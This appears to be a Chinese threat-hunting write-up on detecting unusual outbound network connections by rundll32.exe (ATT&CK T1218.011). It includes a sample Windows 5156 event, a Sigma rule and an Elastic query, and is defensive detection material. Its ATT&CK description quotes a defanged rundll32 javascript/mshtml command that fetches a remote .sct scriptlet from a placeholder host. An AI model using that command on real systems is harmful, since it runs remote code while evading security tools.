# T1218-011-win-通过Rundll32的异常网络链接

## 来自ATT&CK的描述

Rundll32.exe程序可以调用来执行任意二进制文件。攻击者可能会利用此功能来代理执行代码，从而避免触发那些可能不会监控rundll32.exe进程执行的安全工具，因为正常操作中使用rundll32.exe的Windows会有白名单或误报。

Rundll32.exe可用于通过未记录的shell32.dll函数Control_RunDLL和 Control_RunDLLAsUser来执行控制面板项目文件（.cpl）。双击.cpl文件也会触发rundll32.exe执行。

Rundll32也可用于执行JavaScript等脚本。可以使用类似于下面的语法来完成：rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" 。这种方法已被恶意软件如Poweliks所使用。

## 测试案例

Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。

说明：Rundll32.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Rundll32调用。

windows 2003默认位置：

```bash
C:\Windows\System32\rundll32.exe
C:\Windows\SysWOW64\rundll32.exe
```

win7默认位置：

```bash
C:\Windows\System32\rundll32.exe
C:\Windows\SysWOW64\rundll32.exe
```

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需自行配置）

## 测试复现

识别rundll32.exe进行出站网络连接的异常行为。这表明可能存在攻击活动，并可能认识恶意DLL。

## 测试留痕

可参考：[T1218-011-win-基于白名单Rundll32.exe执行payload](https://github.com/12306Bro/Threathunting-book/blob/master/%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32.exe%E6%89%A7%E8%A1%8Cpayload.md)

Examples of 5156

```yml
The Windows Filtering Platform has allowed a connection.

Application Information:

  Process ID: 1752
  Application Name: \device\harddiskvolume1\windows\system32\dns.exe

Network Information:

  Direction: Inbound
  Source Address: 10.45.45.103
  Source Port: 53
  Destination Address: 10.45.45.103
  Destination Port: 50146
  Protocol: 17

Filter Information:

  Filter Run-Time ID: 5
  Layer Name: Receive/Accept
  Layer Run-Time ID: 44
```

## 检测规则/思路

### sigma

```yml
title: 检测通过Rundll32的异常网络链接行为
description: 通过windows日志来检测通过Rundll32的异常网络链接行为
status: experimental
references:
    - https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.T1085
    - attack.TA0002
date: 2020/12/2
logsource:
    category: process_creation
    product: windows
detection:
    selection1:
        EventID: 5156
        Process.name: 'rundll32.exe' #Application Name
    selection2:
        Destination Address:
                        - 10.0.0.0/8
                        - 172.16.0.0/12 
                        - 192.168.0.0/16
    condition: selection1 and not selection2
level: low
```

### Elastic rule query

```yml
process.name:rundll32.exe and event.action:"Network connection
detected (rule: NetworkConnect)" and not destination.ip:(10.0.0.0/8 or
172.16.0.0/12 or 192.168.0.0/16 or 127.0.0.0/8)
```

### 建议

通过进程监控来检测和分析rundll32.exe的执行和参数。比较rundll32.exe的近期调用与历史已知合法参数及已加载动态链接库来确定是否有异常和潜在的攻击活动。在rundll32.exe调用之前和之后使用的命令参数也可用于确定正在加载的动态链接库的来源和目的。

## 参考推荐

MITRE-ATT&CK-T1218-011

<https://attack.mitre.org/techniques/T1218/011/>

通过Rundll32的异常网络链接

<https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html>
